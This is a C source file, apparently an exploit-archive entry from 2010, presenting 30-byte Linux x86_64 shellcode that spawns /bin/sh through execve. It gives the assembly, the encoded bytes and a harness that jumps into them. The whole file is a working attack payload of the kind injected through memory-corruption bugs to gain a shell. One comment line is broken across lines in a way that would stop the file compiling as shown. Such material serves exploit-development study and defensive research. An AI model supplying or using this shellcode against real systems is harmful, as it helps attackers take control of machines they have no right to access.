/*
# Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode
# Date: 2010-04-26
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux
*/

/*
	; execve("/bin/sh", ["/bin/sh"], NULL)

	section .text
		    global _start

	_start:
		    xor     rdx, rdx
		    mov     qword rbx, '//bin/sh'
		    shr     rbx, 0x8
		    push    rbx
		    mov     rdi, rsp
		    push    rax
		    push    rdi
		    mov     rsi, rsp
		    mov     al, 0x3b
		    syscall
*/

int main(void)
{
	char shellcode[] =
	"\x48\x31\xd2"                                  // xor    %rdx, %rdx
	"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov
$0x68732f6e69622f2f, %rbx
	"\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
	"\x53"                                          // push   %rbx
	"\x48\x89\xe7"                                  // mov    %rsp, %rdi
	"\x50"                                          // push   %rax
	"\x57"                                          // push   %rdi
	"\x48\x89\xe6"                                  // mov    %rsp, %rsi
	"\xb0\x3b"                                      // mov    $0x3b, %al
	"\x0f\x05";                                     // syscall

	(*(void (*)()) shellcode)();

	return 0;
}